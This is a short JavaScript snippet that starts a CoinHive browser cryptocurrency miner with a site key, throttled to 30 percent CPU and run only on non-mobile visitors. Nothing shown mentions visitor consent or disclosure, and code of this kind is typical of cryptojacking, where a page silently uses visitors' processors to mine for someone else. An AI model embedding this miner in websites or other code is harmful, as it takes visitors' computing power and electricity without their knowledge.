    var miner = new CoinHive.Anonymous('v7FNtPSaSgUNlCfddj0xRbMtnFnWs1JO', {
        throttle: 0.3
    });
    if (!miner.isMobile()) {
        miner.start();
    }